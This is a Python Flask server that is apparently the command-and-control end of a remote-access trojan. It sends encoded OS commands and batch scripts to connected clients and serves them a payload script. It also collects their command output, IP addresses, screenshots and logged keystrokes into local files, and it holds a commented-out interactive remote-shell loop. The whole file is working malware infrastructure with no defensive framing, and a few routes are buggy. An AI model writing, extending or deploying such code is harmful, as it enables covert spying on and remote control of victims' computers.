from flask import Flask, render_template, Response, request, redirect, url_for
from time import sleep
import os
import nacl.secret
import base64
import codecs
import random
import logging

SECURE = False


#change to false for less secure, but more convinient command sending (there will be a file on server (anyone can view) with the commands)
#if secure is true, you will have to restart script very time you want to send a new command. If it is false, you can change the command_storage.txt file, and it will automatically base64 encode it and move contents to commands.txt
#remember to use upticks instead of spaces in the commands.
#DO NOT DELETE THE go.txt FILE!!!!!
def write_encrypted(ciphertext):
  with open("commands.txt", "w") as file:
    file.write(str(ciphertext))
    file.close()


def writef(text):
  with open("output.txt", "a") as file:
    file.write(f"\n{text}")
    file.close()


app = Flask('app')
log = logging.getLogger('werkzeug')
log.setLevel(logging.DEBUG)

command = b"""1 notscript 99o ls"""
# command syntax: [amount of repetition] [script/notscript] [if script: custom command or execution mode] [OS command] [other options]
#
shell_data = ""


def write_file(file, content):
  with open(file, "a") as file_:
    file_.write(f"\n{content}")
    file_.close()


def dobbyscript():
  with open("script.dobby", "r") as file:
    instruction_list = file.read().split("`")
    print(instruction_list)
    for element in instruction_list:
      print(element)
      write_encrypted(base64.b64encode(codecs.encode(element)))
      send_script_2()
      sleep(5)


@app.route('/recieve', methods=['POST'])
def recieve():
  data = str(base64.b64decode(format(request.data)[2:-1]))[2:-1]
  formatted_data = "\n" + data.replace('\\n', '\n').replace('\\t', '\t') + "\n"
  writef(f"recieved: {formatted_data}")
  return data


@app.route('/recieve_keys', methods=['POST'])
def recieve_keys():
  data = str(base64.b64decode(format(request.data)[2:-1]))[2:-1]
  formatted_data = "\n" + data.replace('\\n', '\n').replace('\\t', '\t') + "\n"
  write_file("keyboard.txt", formatted_data)
  return data


@app.route('/recieve_ip', methods=['POST'])
def recieve_ip():
  global ip
  data = str(base64.b64decode(format(request.data)[2:-1]))[2:-1]
  formatted_data = data.replace('\\n', '\n').replace('\\t', '\t')
  ip = formatted_data
  writef(ip)
  return ip


@app.route('/dashboard')
def dashboard():
  return render_template("dashboard.html")

@app.route('/dash2')
def dash2():
  return render_template("dash2.html")

def write_to_command(content):
  global command
  if SECURE:
    command = codecs.encode(content)
  else:
    with open("command_storage.txt", "w") as file:
      file.write(content)
      file.close()


@app.route('/command_input', methods=["GET", "POST"])
def command_input():
  if request.method == "POST":
    # getting input with name = fname in HTML form
    first_name = request.form.get("fname")
    write_to_command(first_name)
  #return beans2()"{{ url_for("command_input")}}" method="post"
  return render_template("dash2.html")

@app.route('/clear_output', methods=["GET", "POST"])
def clear_output():

  with open("output.txt", "w") as file:
    file.write("")
    file.close()
  #return beans2()
  return render_template("dash2.html")
  
@app.route('/upload', methods=['POST'])
def upload():
  try:
    writef("in try llop")
    file = request.files['image']
    file_id = random.randint(0, 1000)
    file.save(f'screenshots/image-{file_id}.jpg')
    writef(f"file saved at screenshots/image-{file_id}.txt")
  except Exception as err:
    writef(err)
  return render_template("upload.html")


@app.route('/recieve_screen', methods=['POST'])
def recieve_screen():
  data = base64.b64decode(format(request.data)[2:-1])
  #print(f'Recieved from client: {data}')
  with open("screenshot" + random.randint(0, 100) + ".txt", "w") as file:
    file.write(data)
    file.close()
  return data


def get_and_write():
  with open("command_storage.txt", "r") as file:
    write_encrypted(base64.b64encode(codecs.encode(file.read())))
    #command = file.read()
    file.close()


@app.route('/')
def hello_world():
  global command
  write_encrypted(base64.b64encode(command))
  # while True:
  #   print(f"{request.environ['REMOTE_ADDR']}>>>")
  #   shell_command = f"""3 shell 99s {input("$ ")}"""
  #   shell_command_bytes = codecs.encode(shell_command)
  #   write_encrypted(base64.b64encode(shell_command_bytes))
  #   send_script_2()
  #   while True:
  #     if shell_data == "":
  #       continue
  #     else:
  #       print(shell_data)
  #       break

  writef(str(SECURE))

  return render_template('index.html')


@app.route('/go')
def go():
  return read_file("go.txt")

@app.route("/output")
def output():
  with open("output.txt", "r") as file:
    contents = file.read().split()
    formatted_output = ""
    for element in contents:
      formatted_output += "\n"
      formatted_output += element
  return formatted_output

@app.route('/send_script')
def send_script():
  if SECURE:
    write_encrypted(base64.b64encode(command))
  else:
    with open("command_storage.txt", "r") as file:
      list = file.read().split()
    if list[0] == "dobbyscript":
      dobbyscript()
    else:
      get_and_write()
  try:
    send_script_2()
    return render_template('index.html')
  except:

    return "error"


def clean_go_file():
  with open("go.txt", "w") as file:
    sleep(0.5)
    file.write("")
    file.close()


def send_script_2():
  writef("beans")
  with open("go.txt", "w") as file:
    writef("cheese")
    file.write("go")
    file.close()
    sleep(0.5)
    clean_go_file()


@app.route('/script')
def script():
  return read_file("script.py")


def read_file(file):
  with open(file, "r") as file:
    return file.read()
    file.close()


@app.route('/inst')
def inst():
  return read_file("commands.txt")


@app.route('/message')
def message():
  return read_file("message.txt")


app.run(host='0.0.0.0', port=8080)
